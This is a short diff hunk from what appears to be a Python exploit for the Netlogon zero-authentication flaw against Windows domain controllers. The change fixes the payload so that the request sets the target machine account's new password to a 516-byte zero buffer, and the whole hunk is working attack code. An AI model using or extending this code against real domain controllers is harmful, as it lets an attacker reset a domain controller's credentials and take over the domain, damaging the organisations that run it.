@@ -90,9 +90,7 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
       request["Authenticator"] = authenticator
       #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
       #request['ReturnAuthenticator']['Timestamp'] = 0
-      request["ClearNewPassword"] = nrpc.NL_TRUST_PASSWORD()
-      request["ClearNewPassword"]["Buffer"] = b'\x00'*512
-      request["ClearNewPassword"]["Length"] = 0 # It winds up being 516 bytes mentioned in the Secur whitepaper because this is 4 bytes
+      request["ClearNewPassword"] = b"\x00"*516
       resp = rpc_con.request(request)
       resp.dump()
 
